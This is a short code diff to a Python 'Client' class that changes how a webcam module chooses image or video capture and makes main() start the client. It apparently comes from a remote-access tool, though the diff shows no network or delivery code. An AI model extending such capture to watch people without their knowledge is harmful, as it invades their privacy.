@@ -817,11 +817,10 @@ class Client(object):
 
     @module
     def webcam(self):
-        if self.webcam.options['image']:
-            result = self.webcam_image()
-        elif self.webcam.options['video']:
+        if self.webcam.options['video mode']:
             result = self.webcam_video()
-        self.result['webcam'].update({ time.ctime() : result })
+        else:
+            result = self.webcam_image()
         _ = self.threads.pop('webcam', None)
         return result
 
@@ -966,7 +965,7 @@ class Client(object):
 
 def main(*args, **kwargs):
     client = Client(**kwargs)
-    return client
+    return client.start()
 
 
 if __name__ == '__main__':
